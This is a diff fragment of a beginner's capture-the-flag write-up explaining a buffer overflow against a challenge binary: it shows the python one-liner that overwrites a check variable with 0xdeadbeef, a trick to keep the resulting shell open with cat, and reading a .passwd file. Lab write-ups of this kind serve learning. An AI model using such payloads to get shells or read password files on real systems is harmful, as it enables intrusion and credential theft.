@@ -47,7 +47,7 @@ I - Code Source :
         we gonna give the program like 50 or 45 little indian form of 0xdeadbeef so our payload gonna be like :
         python -c 'print "\xef\xbe\xad\xde"*50 ' | ./ch13
     b : we got a shell but it opens and close in the same time so we gonna hold it by using cat command by the payload :
-        (python -c 'print "\xef\xbe\xad\xde"*50 ' ;cat ) | ./ch13
+        (python -c 'print "\xef\xbe\xad\xde"*50 ' ;cat ) | ./ch13 To ouverride Check variable value to (0xdeadbeef).
 4 : finaly we cat the .passwd file and we get the password !
   
   Thank you for reading My first Write-up and am sorry For my bad English
